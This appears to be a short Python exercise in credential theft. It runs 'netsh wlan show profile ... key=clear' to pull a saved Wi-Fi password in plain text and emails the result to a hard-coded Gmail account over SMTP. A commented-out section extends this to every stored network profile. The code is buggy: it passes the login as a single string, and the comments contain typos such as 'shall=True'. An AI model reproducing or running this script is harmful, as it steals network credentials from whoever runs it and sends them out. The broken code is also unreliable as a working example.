#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.Gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile UPC723762 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("BobPage12@gmail.com, abc123abc12", result)


#command = "netsh wlan show profile UPC723762 key=clear"
#networks = subprocess.check_output(command, shall=True)
#network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)


#result = ""
#for network_name in network_names_list:
#    command = "netsh wlan show profile " + network_name + " key is clear"
#    current_result = subprocess.check_output(command, shell=True)
#    result = result + current_result


#send_mail("BobPage12@gmail.com, abc123abc12", result)